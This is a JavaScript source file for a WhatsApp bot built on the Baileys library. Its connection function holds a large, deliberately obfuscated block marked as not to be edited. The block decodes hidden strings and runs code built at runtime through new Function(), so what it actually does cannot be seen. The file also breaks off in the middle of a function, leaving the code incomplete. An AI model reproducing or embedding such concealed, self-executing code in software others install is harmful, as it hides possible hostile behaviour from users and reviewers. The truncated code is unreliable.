/**
 * ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
 * ┃ ⚠ DISCLAIMER                         
 * ┃                                     
 * ┃ 🚀 This bot is powered by Toxxic Tech 
 * ┃ 🔥 The base source code is owned by   
 * ┃    Toxxic Tech and developed by      
 * ┃    Toxxic Boy.                        
 * ┃                                      
 * ┃ ❗ Unauthorized distribution, copying,
 * ┃    or claiming ownership of this code
 * ┃    is strictly prohibited.            
 * ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
 */

const makeWASocket = require('@whiskeysockets/baileys').default;
const {
    default: ToxxicTechConnect,
    delay,
    PHONENUMBER_MCC,
    makeCacheableSignalKeyStore,
    useMultiFileAuthState,
    DisconnectReason,
    fetchLatestBaileysVersion,
    generateForwardMessageContent,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    generateMessageID,
    downloadContentFromMessage,
    makeInMemoryStore,
    jidDecode,
    proto,
    Browsers
} = require("@whiskeysockets/baileys");
const NodeCache = require("node-cache");
const Pino = require("pino");
const pino = require('pino');
const readline = require("readline");
const {
    parsePhoneNumber
} = require("libphonenumber-js");
const store = makeInMemoryStore({
    logger: pino().child({
        level: 'silent',
        stream: 'store'
    })
});
const axios = require('axios');
const question = (text) => {
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    });
    return new Promise((resolve) => {
        rl.question(text, resolve)
    })
};
const config = require('./config');
// DON'T EDIT THIS PART
async function connectBot() {
    const {
        state,
        saveCreds
    } = await useMultiFileAuthState('session');
    const {
        version
    } = await fetchLatestBaileysVersion();

    function var_1() {}
    var var_2, var_3, var_4, var_5, var_6, var_7, var_8, var_9, var_10, var_11, var_12, var_13, var_14, var_15, var_16, var_17, var_18, var_19, var_20, var_21;

    function var_22(var_1) {
        return var_2[var_1 > 96 ? var_1 - -65 : var_1 - -59]
    }
    var_2 = var_40();

    function var_23(var_1, var_4) {
        function var_5(var_1) {
            return var_2[var_1 > 31 ? var_1 > 31 ? var_1 > 31 ? var_1 - 32 : var_1 - 66 : var_1 - -39 : var_1 - -71]
        }
        return var_3(var_1, var_5(34), {
            'value': var_4,
            'configurable': true
        })
    }
    var var_24 = [],
        var_25 = [var_38(var_22(-58)), var_38(var_22(-53)), var_38(var_22(-59)), var_38(3), 'hDVu|%ss?a0', var_38(var_22(-55)), var_38(5), '>|C=#8VX', var_38(var_22(-38)), var_38(var_22(-36)), var_38(var_22(-4)), var_38(var_22(-8)), var_38(10), 'o|:?6H*V', 'lQN;Wr:)rKEn4|_v[tQ93', ')puR|', '|Py;a+xg}1lqGM|~H&KR', var_38(var_22(36)), var_38(12), var_38(var_22(8)), 't|Q?5Q@oPy>h4|O&Q;:', '/{8?~W6g!Y]6[BfnkB:?lrScD/9w:|w,5|X!Z', var_38(var_22(-25)), var_38(var_22(-39)), var_38(16), var_38(var_22(38)), var_38(var_22(-35)), var_38(19), var_38(var_22(39)), '*|GH3', var_38(var_22(40)), var_38(var_22(41)), var_38(var_22(42)), var_38(var_22(44)), var_38(var_22(-24)), var_38(var_22(-23)), var_38(27), var_38(var_22(55)), var_38(var_22(66)), var_38(var_22(57)), var_38(31), var_38(var_22(46)), var_38(var_22(52)), var_38(var_22(23)), var_38(var_22(47)), var_38(var_22(65)), var_38(var_22(-56)), var_38(38), var_38(var_22(-51)), var_38(40), var_38(var_22(-52)), var_38(var_22(45)), var_38(var_22(28)), var_38(var_22(-1)), var_38(45), var_38(46), var_38(var_22(48)), var_38(var_22(-13)), var_38(49), var_38(var_22(74)), var_38(var_22(-34)), var_38(var_22(62)), var_38(var_22(53)), '2Y|0}W!2%u,UK[H', var_38(var_22(-12)), var_38(55), var_38(var_22(78)), var_38(var_22(79)), var_38(var_22(58)), var_38(59), var_38(60), var_38(61), var_38(var_22(81)), 'tZ5[@lDtD5nCm|/"Vpg}n,bDO', '{+E|ubyZ5yfHI', var_38(var_22(-40)), var_38(var_22(83)), var_38(var_22(50)), 'wxnZo$rQ08]zG3!|PtB@Wfoip9sY3|cg=G72hTIsQkyn2vq&', var_38(66), var_38(67), var_38(68), '?k|$aw_t:KqmS+VaLz#b5XXq$1(nvw!X0QV${fO4Yq~', var_38(var_22(30)), var_38(var_22(51)), var_38(71), 'qzRHQ&]cT)UUoC7nv|qkb6s/l{<HrTEYV?jk2bI', var_38(72), var_38(var_22(-31)), var_38(var_22(-22)), var_38(75), '$y:hFqUJV{*nH((/E^|QzC^O!9VQ{V[XH2V', '^tk$r!5V_mNQhr,/P|R3oCvaB)eTpCBP+I', var_38(76), var_38(77), ':hbo>#o~mY))S{+g.pp2hp}gUYJyd&g"o:+!|', var_38(var_22(-20)), var_38(79), var_38(80), var_38(var_22(95)), var_38(var_22(68)), var_38(var_22(20)), var_38(var_22(35)), var_38(85), var_38(var_22(69)), var_38(var_22(27)), 'qi|Q{=M#AdeT7V}XE"RQP,"/.;m$e1N,R|BHl=#ZB', var_38(var_22(7)), var_38(var_22(11)), '&ZJa*Dk8[/yUd6@NLQl[me]([d&!l1Ig)|4B|blfn10H2:R', var_38(var_22(22)), var_38(91), var_38(var_22(-41)), var_38(93), '?h_R"[I(NG[!7Ngs|&%oVDfZ{u>Z/raZ*&W]xlh6^A5', var_38(var_22(-30)), var_38(var_22(33)), 'c2uRLT2fk=|6i05nHiuO', var_38(96), var_38(97), var_38(var_22(32)), var_38(99), var_38(var_22(-28)), '(|%HSvebgymamA{GN;5Umx~J', var_38(101), '>^5;PU$QZdjHgSgng|j]', 'hQAOxl>"aq`qf(|s?:)RQ$;WO)e1=cY3g;V', var_38(102), '],H2z(Vc|Gb,jFaZ$s+nYvlO:;Bl"&5"QeoB*Dr)4`R".B', var_38(103), var_38(var_22(-15)), var_38(var_22(-16)), ')fIQ.Wp6Bk`/|rw(K[W;Tp:qkY2"7[C/TUYQlr[F~Y', 'feT|~$`gyfm0mv(/XPqBEC%b:', var_38(var_22(17)), 'Bh6QHe7""Kp[;&|Z.PBhNb66H5M{3V;,,K!@,$D`[qg)z{/"', var_38(var_22(15)), var_38(var_22(-49)), '~e0QuMYOg)1mW,[3],X[kxX)rKU5BXD|pyQH<.mO<G[uJ', var_38(109), var_38(110), 'W"~3=0|V', var_38(111), var_38(112), 'G?g}0voF9=vlsvt|<YpZ:"2T$yRe8A)X6|,HMv~FZA/TI', var_38(var_22(87)), var_38(114), var_38(115), var_38(116), var_38(117), var_38(118), var_38(var_22(10)), var_38(120), '|t!H(tF861e', 'b+?3[XeDsyk$[[>Z|Z+n^,cDhA', var_38(var_22(59)), '~+Ja2}lZB;qcTTqi8fH|7+F)X63ex&:2dkC[QHI', var_38(var_22(-5)), '=yuO+xt(u8DU:X6({qt[7#gbrp$JfgnZ|J', var_38(var_22(-43)), var_38(124), var_38(125), var_38(var_22(-2)), var_38(127), var_38(var_22(-44)), var_38(var_22(-11)), var_38(var_22(-17)), var_38(var_22(-18)), 'y;|?Aex/O', 'Ui|3I7)o?pu:d),gWQV', var_38(132), '(&M?[HsKr{/:|&Nn"k)Rx60D2{B;bMas~h=b3M4J', var_38(133), var_38(var_22(-19)), var_38(135), 'j"$?(Fv(sAOi(3$|=1*QvtL6pywJpM+8minHub7KVK7rJ', var_38(var_22(13)), var_38(137), var_38(138), var_38(139), var_38(var_22(14)), var_38(141), var_38(var_22(-32)), var_38(143), '""pHCe?g(8FB?+X&]K!ovW>WW/WpM|AtytV', var_38(var_22(26)), var_38(145), '4^tQYb!DE`SgNCXvLQ|3/M^O2KzU)e]N>snH|f(VK18)mAJi'];
    var_5 = var_23((...var_3) => {
        function var_4(var_3) {
            return var_2[var_3 > 147 ? var_3 - -45 : var_3 > -9 ? var_3 < -9 ? var_3 - 47 : var_3 - -8 : var_3 - -52]
        }
        var_1(var_3[var_4(-6)] = 5, var_3[var_4(-3)] = -var_4(-5));
        if (typeof var_3[3] === var_38(146)) {
            var_3[3] = var_36
        }
        if (typeof var_3[var_4(-4)] === var_38(var_3[var_22(-54)] - -183)) {
            function var_6(var_3) {
                return var_2[var_3 > 140 ? var_3 - -71 : var_3 - -15]
            }
            var_3[var_6(-11)] = var_24
        }
        if (var_3[var_22(-53)]) {
            function var_7(var_3) {
                return var_2[var_3 > 89 ? var_3 - 54 : var_3 - -66]
            } [var_3[var_3[var_22(-54)] - -var_7(-59)], var_3[1]] = [var_3[var_4(1)](var_3[var_3[var_7(-61)] - -var_4(-1)]), var_3[var_3['var_1'] - (var_3[var_7(-61)] - (var_3['var_1'] - -37))] || var_3[var_3[var_4(-3)] - -var_4(0)]];
            return var_5(var_3[var_3[var_22(-54)] - -37], var_3[var_3[var_4(-3)] - -41], var_3[var_3[var_4(-3)] - -var_7(-58)])
        }
        var_3[var_4(3)] = var_3[var_3[var_4(-3)] - -var_4(-1)];
        if (var_3[2] == var_3[var_4(-7)]) {
            function var_8(var_3) {
                return var_2[var_3 < 100 ? var_3 > 100 ? var_3 - -15 : var_3 > -56 ? var_3 > -56 ? var_3 - -55 : var_3 - 67 : var_3 - 46 : var_3 - -9]
            }
            return var_3[var_3[var_22(-54)] - -var_22(-46)][var_24[var_3[var_3[var_8(-50)] - -var_22(-51)]]] = var_5(var_3[var_22(-58)], var_3[var_3['var_1'] - -38])
        }
        if (var_3[var_22(-59)] == var_3[var_22(-50)]) {
            function var_9(var_3) {
                return var_2[var_3 < 110 ? var_3 > -46 ? var_3 - -45 : var_3 - 24 : var_3 - 20]
            }
            return var_3[var_9(-39)] ? var_3[var_22(-58)][var_3[71][var_3[var_3[var_9(-40)] - -38]]] : var_24[var_3[var_9(-44)]] || (var_3[var_9(-45)] = var_3[var_3['var_1'] - -var_22(-49)][var_3[var_3[var_4(-3)] - -37]] || var_3[var_3[var_22(-54)] - -var_4(4)], var_24[var_3[var_3['var_1'] - -var_22(-56)]] = var_3[var_3[var_22(-54)] - -39](var_25[var_3[var_3['var_1'] - -37]]))
        }
        if (var_3[var_4(1)] === var_4(24)) {
            function var_10(var_3) {
                return var_2[var_3 < 119 ? var_3 > -37 ? var_3 - -36 : var_3 - -68 : var_3 - 83]
            }
            var_5 = var_3[var_10(-25)]
        }
        if (var_3[3] === var_5) {
            function var_11(var_3) {
                return var_2[var_3 > 237 ? var_3 - -15 : var_3 < 81 ? var_3 - -32 : var_3 > 81 ? var_3 < 81 ? var_3 - -21 : var_3 - 82 : var_3 - 91]
            }
            var_36 = var_3[1];
            return var_36(var_3[var_3[var_22(-54)] - -var_11(90)])
        }
        if (var_3[2] && var_3[var_3['var_1'] - -var_4(4)] !== var_36) {
            var_5 = var_36;
            return var_5(var_3[var_3['var_1'] - -37], -var_22(-53), var_3[2], var_3[var_22(-50)], var_3[var_3['var_1'] - -108])
        }
        if (var_3[0] !== var_3[var_3[var_22(-54)] - -var_4(5)]) {
            function var_12(var_3) {
                return var_2[var_3 > 248 ? var_3 - 38 : var_3 < 92 ? var_3 - -84 : var_3 > 92 ? var_3 - 93 : var_3 - -84]
            }
            return var_3[var_12(104)][var_3[var_3[var_22(-54)] - -var_12(96)]] || (var_3[71][var_3[var_3[var_22(-54)] - -37]] = var_3[3](var_25[var_3[var_4(-7)]]))
        }
    }, 5);

    function var_26() {
        return globalThis
    }

    function var_27() {
        return global
    }

    function var_28() {
        return window
    }

    function var_29() {
        return new Function(var_38(var_22(89)))()
    }

    function var_30(var_3 = [var_26, var_27, var_28, var_29], var_4, var_5 = [], var_6, var_7) {
        function var_8(var_3) {
            return var_2[var_3 > -59 ? var_3 < 97 ? var_3 - -58 : var_3 - 8 : var_3 - 52]
        }
        var_4 = var_4;
        try {
            var_1(var_4 = Object, var_5[var_38(var_8(-20))]('' [var_38(149)][var_38(150)][var_38(151)]))
        } catch (e) {}
        _du1kLw: for (var_6 = var_22(-58); var_6 < var_3[var_38(var_8(-44))]; var_6++) {
            try {
                var_4 = var_3[var_6]();
                for (var_7 = 0; var_7 < var_5[var_38(var_8(-44))]; var_7++) {
                    function var_9(var_3) {
                        return var_2[var_3 < 6 ? var_3 - -14 : var_3 < 162 ? var_3 - 7 : var_3 - -13]
                    }
                    if (typeof var_4[var_5[var_7]] === var_38(var_9(33))) continue _du1kLw
                }
                return var_4
            } catch (e) {}
        }
        return var_4 || this
    }
    var_1(var_6 = var_30() || {}, var_7 = var_6[var_38(153)], var_8 = var_6[var_38(154)], var_9 = var_6[var_38(155)], var_10 = var_6[var_38(156)] || String, var_11 = var_6[var_38(157)] || Array, var_12 = function() {
        var var_3, var_4, var_5;

        function var_6(var_3) {
            return var_2[var_3 < -65 ? var_3 - 39 : var_3 < 91 ? var_3 - -64 : var_3 - -77]
        }
        var_1(var_3 = new var_11(var_6(-49)), var_4 = var_10[var_38(var_22(-37))] || var_10[var_38(159)], var_5 = []);
        return var_23(function(...var_7) {
            var var_8;

            function var_9(var_7) {
                return var_2[var_7 > -18 ? var_7 < 138 ? var_7 > 138 ? var_7 - 79 : var_7 < 138 ? var_7 - -17 : var_7 - -11 : var_7 - 73 : var_7 - -78]
            }
            var_1(var_7[var_6(-62)] = var_22(-53), var_7[223] = var_6(-48));
            var var_11, var_12;
            var_1(var_7[3] = var_7[var_7[223] - var_22(-43)][var_38(var_9(-3))], var_5[var_38(var_6(-50))] = var_22(-58));
            for (var_8 = var_22(-58); var_8 < var_7[3];) {
                function var_13(var_7) {
                    return var_2[var_7 > -56 ? var_7 < 100 ? var_7 > -56 ? var_7 - -55 : var_7 - 80 : var_7 - -4 : var_7 - 37]
                }
                var_12 = var_7[var_7[var_7[var_13(-38)] - -100] - 123][var_8++];
                if (var_12 <= 127) {
                    var_11 = var_12
                } else if (var_12 <= var_13(-38)) {
                    function var_14(var_7) {
                        return var_2[var_7 > -19 ? var_7 > 137 ? var_7 - 58 : var_7 - -18 : var_7 - 47]
                    }
                    var_11 = (var_12 & var_7[var_9(0)] - var_14(0)) << 6 | var_7[var_13(-54)][var_8++] & var_13(-36)
                } else if (var_12 <= 239) {
                    function var_15(var_7) {
                        return var_2[var_7 < 166 ? var_7 > 10 ? var_7 < 10 ? var_7 - -89 : var_7 > 166 ? var_7 - 34 : var_7 - 11 : var_7 - -48 : var_7 - 38]
                    }
                    var_11 = (var_12 & var_9(3)) << var_9(16) | (var_7[var_7[var_6(-47)] - var_22(-43)][var_8++] & var_6(-45)) << var_13(-34) | var_7[var_7[var_13(-38)] - var_6(-48)][var_8++] & var_15(30)
                } else if (var_10[var_38(var_6(-42))]) {
                    function var_16(var_7) {
                        return var_2[var_7 < 177 ? var_7 - 22 : var_7 - 98]
                    }
                    var_11 = (var_12 & var_9(6)) << var_16(46) | (var_7[var_7[223] - var_16(38)][var_8++] & var_13(-36)) << 12 | (var_7[var_16(23)][var_8++] & var_16(41)) << 6 | var_7[0][var_8++] & var_13(-36)
                } else {
                    var_1(var_11 = var_22(-40), var_8 += 3)
                }
                var_5[var_38(148)](var_3[var_11] || (var_3[var_11] = var_4(var_11)))
            }
            if (var_7[var_22(-42)] > var_7[var_6(-47)] - -var_6(-39)) {
                return var_7[19]
            } else {
                return var_5[var_38(var_22(19))]('')
            }
        }, 1)
    }(), var_23(var_31, var_22(-53)));

    function var_31(...var_3) {
        function var_4(var_3) {
            return var_2[var_3 > 103 ? var_3 - -30 : var_3 < 103 ? var_3 - -52 : var_3 - -2]
        }
        var_1(var_3[var_22(-57)] = var_22(-53), var_3[var_22(-35)] = var_3[var_22(-58)]);
        if (typeof var_7 !== var_38(var_4(-26)) && var_7) {
            return new var_7()[var_38(var_4(38))](new var_8(var_3[var_4(-28)]))
        } else if (typeof var_9 !== var_38(146) && var_9) {
            function var_5(var_3) {
                return var_2[var_3 > 35 ? var_3 - 36 : var_3 - 30]
            }
            return var_9[var_38(162)](var_3[var_5(60)])[var_38(163)](var_38(164))
        } else {
            return var_12(var_3[18])
        }
    }
    var_1(var_13 = var_5(var_22(82)), var_14 = var_5(var_22(24)), var_15 = var_5(var_22(-32)), var_16 = var_5(108), var_17 = var_5(var_22(-31)), var_18 = {
        [var_38(var_22(37))]: var_5(16),
        [var_38(166)]: var_5[var_38(var_22(-29))](undefined, [var_22(-30)]),
        [var_38(168)]: var_5[var_38(var_22(-29))](undefined, [var_22(-28)]),
        [var_38(169)]: var_5(var_22(-43)),
        [var_38(170)]: var_5[var_38(171)](var_22(-27), 131)
    }, var_19 = var_5(var_22(-26)), var_20 = [var_5(var_22(86)), var_5(var_22(-25)), var_5(var_22(-24)), var_5(var_22(-23)), var_5(var_22(-22))], var_21 = function(...var_3) {
        var var_4;

        function var_5(var_3) {
            return var_2[var_3 < 247 ? var_3 > 91 ? var_3 - 92 : var_3 - 66 : var_3 - -69]
        }
        var_1(var_3[var_22(-57)] = var_22(-58), var_3[var_22(-21)] = var_22(-20), var_4 = var_23((...var_3) => {
            function var_5(var_3) {
                return var_2[var_3 < 62 ? var_3 > -94 ? var_3 > -94 ? var_3 < -94 ? var_3 - 99 : var_3 - -93 : var_3 - -76 : var_3 - 47 : var_3 - -98]
            }
            var_1(var_3[var_22(-57)] = 5, var_3[var_22(-54)] = var_5(-53));
            if (typeof var_3[var_22(-50)] === var_38(146)) {
                var_3[var_3['var_1'] - var_22(-18)] = var_7
            }
            if (typeof var_3[var_22(-55)] === var_38(146)) {
                function var_6(var_3) {
                    return var_2[var_3 > 208 ? var_3 - -48 : var_3 > 208 ? var_3 - -41 : var_3 > 52 ? var_3 > 52 ? var_3 - 53 : var_3 - 55 : var_3 - 66]
                }
                var_3[var_3[var_22(-54)] - var_6(95)] = var_24
            }
            if (var_3[var_3['var_1'] - 132] == var_3[var_3[var_5(-88)] - var_5(-53)]) {
                function var_8(var_3) {
                    return var_2[var_3 < 194 ? var_3 - 39 : var_3 - 9]
                }
                return var_3[var_5(-87)][var_24[var_3[var_22(-59)]]] = var_4(var_3[var_8(40)], var_3[var_8(45)])
            }
            var_3[var_22(-14)] = var_5(-50);
            if (var_3[0] !== var_3[1]) {
                function var_9(var_3) {
                    return var_2[var_3 < -44 ? var_3 - -53 : var_3 > -44 ? var_3 - -43 : var_3 - 0]
                }
                return var_3[var_3['var_2'] - 101][var_3[0]] || (var_3[var_5(-89)][var_3[var_3[var_9(-38)] - var_5(-53)]] = var_3[var_22(-50)](var_25[var_3[var_3[var_9(-38)] - 134]]))
            }
            if (var_3[2] && var_3[3] !== var_7) {
                function var_10(var_3) {
                    return var_2[var_3 > 14 ? var_3 > 170 ? var_3 - 44 : var_3 < 14 ? var_3 - 22 : var_3 < 14 ? var_3 - 53 : var_3 - 15 : var_3 - -81]
                }
                var_4 = var_7;
                return var_4(var_3[var_3['var_2'] - var_5(-50)], -var_22(-53), var_3[var_10(15)], var_3[3], var_3[var_5(-89)])
            }
            if (var_3[var_5(-93)] == var_3[var_5(-84)]) {
                function var_11(var_3) {
                    return var_2[var_3 > 227 ? var_3 - -32 : var_3 > 227 ? var_3 - 16 : var_3 < 71 ? var_3 - 97 : var_3 > 71 ? var_3 - 72 : var_3 - 85]
                }
                return var_3[var_3[var_11(77)] - 133] ? var_3[var_3[var_22(-54)] - 134][var_3[4][var_3[var_3['var_2'] - var_5(-49)]]] : var_24[var_3[var_11(73)]] || (var_3[var_11(72)] = var_3[var_3[var_11(117)] - 101][var_3[var_3[var_11(77)] - var_5(-53)]] || var_3[var_5(-84)], var_24[var_3[var_3[var_11(117)] - (var_3[var_11(117)] - var_22(-58))]] = var_3[var_22(-59)](var_25[var_3[var_11(73)]]))
            }
            if (var_3[var_22(-53)]) {
                function var_12(var_3) {
                    return var_2[var_3 < 135 ? var_3 > -21 ? var_3 - -20 : var_3 - 34 : var_3 - 6]
                } [var_3[4], var_3[var_22(-53)]] = [var_3[var_5(-84)](var_3[var_5(-89)]), var_3[var_3['var_1'] - var_5(-53)] || var_3[var_5(-93)]];
                return var_4(var_3[var_5(-92)], var_3[4], var_3[var_12(-20)])
            }
            if (var_3[var_5(-84)] === var_22(-27)) {
                var_4 = var_3[var_3[var_5(-88)] - (var_3[var_22(-54)] - var_22(-55))]
            }
        }, 5), var_3[var_22(-21)] = -129, var_3[var_5(141)] = {
            var_1: var_22(25),
            var_2: var_22(-13),
            var_3: var_22(-12),
            var_4: var_4(var_3[148] - -var_5(140)),
            var_6: var_4(var_3[var_5(130)] - (var_3[var_5(130)] - var_22(-53))),
            var_8: var_5(228)
        });
        if (var_3[var_22(-21)] > -var_22(67)) {
            return var_3[188]
        } else {
            function var_6(var_3) {
                return var_2[var_3 > 153 ? var_3 - 0 : var_3 < -3 ? var_3 - -54 : var_3 - -2]
            }
            return var_3[var_6(47)]
        }
        var_1(var_3[var_5(130)] = var_5(222), var_23(var_7, var_22(-53)));

        function var_7(...var_3) {
            var var_4;

            function var_6(var_3) {
                return var_2[var_3 < -19 ? var_3 - -25 : var_3 > 137 ? var_3 - -70 : var_3 < 137 ? var_3 < 137 ? var_3 - -18 : var_3 - 54 : var_3 - 59]
            }
            var_1(var_3[var_22(-57)] = var_5(98), var_3[var_6(32)] = 129, var_3[var_22(-53)] = '.QDqBnfSXN1pOo0$!)GT%7V}~ib3?_Z;x{,(l2@k>`945KAgu+jcs=MWHy^JUzh]:Iv/*6m|"8ECtd&P#wYRr<LFe[a', var_3[var_5(144)] = var_3[var_5(98)], var_3[var_5(137)] = '' + (var_3[var_3[var_6(32)] - var_22(-11)] || ''), var_3[var_5(101)] = var_3['var_2'].length, var_3[var_6(38)] = [], var_3[var_22(-6)] = var_3[var_6(32)] - var_5(140), var_3[var_22(-38)] = var_3[var_5(142)] - var_6(30), var_3[var_22(-36)] = -(var_3[var_22(-9)] - (var_3['var_10'] - 1)));
            for (var_4 = var_22(-58); var_4 < var_3[var_5(101)]; var_4++) {
                function var_7(var_3) {
                    return var_2[var_3 < 32 ? var_3 - 18 : var_3 > 32 ? var_3 - 33 : var_3 - -75]
                }
                var_3[var_7(84)] = var_3[var_6(34)].indexOf(var_3[var_22(-14)][var_4]);
                if (var_3[9] === -1) continue;
                if (var_3[7] < var_7(34)) {
                    var_3[7] = var_3[var_22(-8)]
                } else {
                    function var_8(var_3) {
                        return var_2[var_3 < 67 ? var_3 - -40 : var_3 > 67 ? var_3 > 223 ? var_3 - -76 : var_3 > 67 ? var_3 - 68 : var_3 - -94 : var_3 - 0]
                    }
                    var_1(var_3[7] += var_3[var_3['var_10'] - 120] * var_8(130), var_3[var_8(121)] |= var_3[var_7(56)] << var_3[var_3[var_6(32)] - var_7(49)], var_3[var_8(89)] += (var_3[var_3[var_5(142)] - var_6(36)] & var_5(157)) > var_3[var_22(-9)] - var_7(40) ? var_3[var_7(83)] - 116 : var_8(102));
                    do {
                        var_1(var_3['var_4'].push(var_3[var_6(35)] & var_8(136)), var_3[var_3['var_10'] - 124] >>= var_22(-4), var_3[var_3['var_10'] - var_6(-2)] -= var_3[var_6(32)] - 121)
                    } while (var_3[var_7(54)] > var_5(115));
                    var_3[var_5(115)] = -1
                }
            }
            if (var_3[7] > -var_5(98)) {
                function var_9(var_3) {
                    return var_2[var_3 < 74 ? var_3 - -38 : var_3 < 74 ? var_3 - -53 : var_3 - 75]
                }
                var_3[var_6(38)].push((var_3[5] | var_3[var_6(5)] << var_3[var_3['var_10'] - 123]) & var_3[var_9(125)] - -var_9(132))
            }
            if (var_3[var_5(142)] > var_3[var_5(142)] - -53) {
                function var_10(var_3) {
                    return var_2[var_3 > 139 ? var_3 - -100 : var_3 < 139 ? var_3 - -16 : var_3 - -86]
                }
                return var_3[var_10(61)]
            } else {
                return var_31(var_3[var_6(38)])
            }
        }
    }());
    var var_32, var_33 = function(var_3) {
        var_3 = var_23((...var_4) => {
            function var_5(var_4) {
                return var_2[var_4 < 100 ? var_4 - -55 : var_4 - 8]
            }
            var_1(var_4[var_22(-57)] = var_22(-6), var_4[var_5(-50)] = var_4[var_22(-50)]);
            if (typeof var_4[var_5(-50)] === var_38(var_5(-29))) {
                var_4[var_22(-54)] = var_9
            }
            if (typeof var_4[var_22(-55)] === var_38(146)) {
                var_4[4] = var_24
            }
            if (var_4[var_22(-58)] !== var_4[1]) {
                return var_4[var_22(-55)][var_4[var_22(-58)]] || (var_4[var_5(-51)][var_4[var_22(-58)]] = var_4['var_1'](var_25[var_4[var_22(-58)]]))
            }
            if (var_4['var_1'] === var_3) {
                var_9 = var_4[var_22(-53)];
                return var_9(var_4[2])
            }
            if (var_4[1]) {
                function var_6(var_4) {
                    return var_2[var_4 > 1 ? var_4 > 1 ? var_4 - 2 : var_4 - -96 : var_4 - 85]
                } [var_4[var_6(6)], var_4[var_22(-53)]] = [var_4[var_6(7)](var_4[var_5(-51)]), var_4[var_22(-58)] || var_4[2]];
                return var_3(var_4[0], var_4[4], var_4[2])
            }
            if (var_4[var_5(-55)] == var_4[var_22(-58)]) {
                function var_7(var_4) {
                    return var_2[var_4 > 216 ? var_4 - -93 : var_4 > 60 ? var_4 > 60 ? var_4 - 61 : var_4 - -68 : var_4 - -40]
                }
                return var_4[1][var_24[var_4[2]]] = var_3(var_4[var_7(62)], var_4[var_7(67)])
            }
        }, var_22(-6));

        function var_4() {
            return globalThis
        }

        function var_5() {
            return global
        }

        function var_6() {
            return window
        }

        function var_7(var_3) {
            var_3 = var_23((...var_5) => {
                function var_6(var_5) {
                    return var_2[var_5 > 234 ? var_5 - -35 : var_5 < 234 ? var_5 > 78 ? var_5 - 79 : var_5 - 63 : var_5 - -55]
                }
                var_1(var_5[var_22(-57)] = var_6(132), var_5[169] = -var_22(-8));
                if (typeof var_5[3] === var_38(146)) {
                    var_5[var_6(88)] = var_4
                }
                var_5[var_22(0)] = -var_22(-1);
                if (typeof var_5[4] === var_38(var_6(105))) {
                    var_5[4] = var_24
                }
                if (var_5[var_6(79)] && var_5[var_22(-50)] !== var_4) {
                    var_3 = var_4;
                    return var_3(var_5[var_5[var_5[var_6(138)] - -var_6(139)] - -var_6(137)], -(var_5[var_5[var_6(138)] - -var_6(139)] - -var_6(208)), var_5[var_22(-59)], var_5[var_22(-50)], var_5[var_6(83)])
                }
                if (var_5[var_5[var_22(0)] - -var_22(-1)] !== var_5[1]) {
                    function var_7(var_5) {
                        return var_2[var_5 < 111 ? var_5 - -44 : var_5 - -76]
                    }
                    return var_5[4][var_5[var_7(-43)]] || (var_5[var_22(-55)][var_5[var_5[var_7(15)] - -var_22(-1)]] = var_5[var_6(88)](var_25[var_5[0]]))
                }
            }, var_22(-6));
            return new Function(var_3(2))();
            var_23(var_4, 1);

            function var_4(...var_3) {
                var var_4;

                function var_5(var_3) {
                    return var_2[var_3 < 89 ? var_3 < 89 ? var_3 < 89 ? var_3 > -67 ? var_3 - -66 : var_3 - 0 : var_3 - 42 : var_3 - 76 : var_3 - -48]
                }
                var_1(var_3[var_22(-57)] = var_22(-53), var_3['var_10'] = var_3[var_22(-58)], var_3[1] = 'q0z`rAN9tG{DjPTY6!>}(HBy7ZQO_JKpkx)Cw[2^E+viFX1hdn.og=*|"3Icb8:Ve~R#UM?$<4%uS5Ls,Wla@m]f&/;', var_3[99] = var_3[var_22(-38)], var_3[var_22(-14)] = '' + (var_3[var_22(-9)] || ''), var_3[var_22(-10)] = var_3[var_22(-14)].length, var_3['var_4'] = [], var_3[var_5(-3)] = var_22(-58), var_3[var_5(-2)] = var_22(-58), var_3[var_22(2)] = -var_22(-53));
                for (var_4 = var_22(-58); var_4 < var_3[var_5(-17)]; var_4++) {
                    var_3[var_22(-8)] = var_3[var_5(-60)].indexOf(var_3[var_5(-21)][var_4]);
                    if (var_3[var_22(-8)] === -1) continue;
                    if (var_3[var_22(2)] < var_5(-65)) {
                        var_3[var_22(2)] = var_3[var_5(-15)]
                    } else {
                        function var_6(var_3) {
                            return var_2[var_3 > 40 ? var_3 < 40 ? var_3 - 6 : var_3 > 40 ? var_3 > 196 ? var_3 - 85 : var_3 - 41 : var_3 - -70 : var_3 - 91]
                        }
                        var_1(var_3['var_7'] += var_3[var_22(-8)] * var_5(-4), var_3[var_5(-3)] |= var_3[var_5(-5)] << var_3[var_22(5)], var_3[99] += (var_3[var_6(102)] & var_22(6)) > var_5(0) ? var_6(108) : var_22(-25));
                        do {
                            var_1(var_3[var_22(-3)].push(var_3['var_5'] & 255), var_3['var_5'] >>= var_6(96), var_3[var_6(105)] -= 8)
                        } while (var_3[var_6(105)] > var_5(-43));
                        var_3[var_5(-5)] = -1
                    }
                }
                if (var_3[var_22(2)] > -var_22(-53)) {
                    var_3[var_5(-10)].push((var_3['var_5'] | var_3[var_22(2)] << var_3[var_5(-2)]) & var_5(2))
                }
                return var_31(var_3[var_5(-10)])
            }
        }

        function var_8(var_3 = [var_4, var_5, var_6, var_7], var_8, var_9, var_10 = [], var_11, var_12, var_13, var_14, var_15, var_16) {
            var_1(var_8 = var_23((...var_3) => {
                function var_9(var_3) {
                    return var_2[var_3 > 75 ? var_3 > 231 ? var_3 - -40 : var_3 > 231 ? var_3 - -60 : var_3 - 76 : var_3 - -31]
                }
                var_1(var_3[var_22(-57)] = 5, var_3['var_1'] = -var_22(10));
                if (typeof var_3[var_3[var_22(-54)] - -var_22(-5)] === var_38(var_9(102))) {
                    var_3[var_9(85)] = var_19
                }
                if (typeof var_3[var_9(80)] === var_38(var_22(-33))) {
                    function var_10(var_3) {
                        return var_2[var_3 < 79 ? var_3 > -77 ? var_3 < 79 ? var_3 < -77 ? var_3 - 24 : var_3 - -76 : var_3 - -34 : var_3 - -26 : var_3 - -86]
                    }
                    var_3[var_3[var_10(-71)] - -123] = var_24
                }
                var_3[var_22(11)] = var_3[var_3['var_1'] - -var_9(145)];
                if (var_3[var_3[var_9(81)] - -var_22(-5)] === var_22(-27)) {
                    var_8 = var_3[var_22(-55)]
                }
                if (var_3[var_22(-53)]) {
